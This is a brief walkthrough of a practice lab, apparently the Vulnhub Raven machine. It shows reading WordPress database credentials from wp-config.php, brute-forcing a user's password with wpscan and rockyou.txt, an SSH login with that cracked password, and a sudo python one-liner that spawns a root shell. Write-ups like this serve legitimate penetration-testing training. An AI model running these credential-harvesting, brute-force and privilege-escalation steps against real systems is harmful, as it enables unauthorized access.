test
Login ssh with user michael@ip and password: michael

found config belong to wordpress credentials, these looks like mysql credential

atfirst visit to cd /var/www/html/wordpress

cat wp-config.php

<img width="814" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/a2731812-fd5b-4212-9081-f3b26ee78a37">

tried to loggin with those credential : **mysql -u root -p** 

<img width="957" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/28424e02-74f9-473e-a834-8d299154eacb">

we can cracking this hash with two methods with wpscan tools or with jhontheripper tools
i only simulated with wpscan tool to brute force the hash.

Cracking user steven with wpscan tools

**Command : wpscan --url raven.local -usernames steven -passwords /usr/share/wordlists/rockyou.txt**

<img width="708" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/5ee84fd3-b7e9-4677-81bf-120888c9125d">

Login ssh with users steven@ip password: **pink84**

<img width="571" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/0215bd7f-9503-4246-8dc8-aa395c20477f">

Privilage escalation :
sudo -l , **command: sudo python -c 'import os; os.system("/bin/sh")'

<img width="458" alt="image" src="https://github.com/psfauzi/Vulnhub_Like_OSCP/assets/49013900/5fa91bf1-2f1a-4337-bab4-c159c97ebae3">


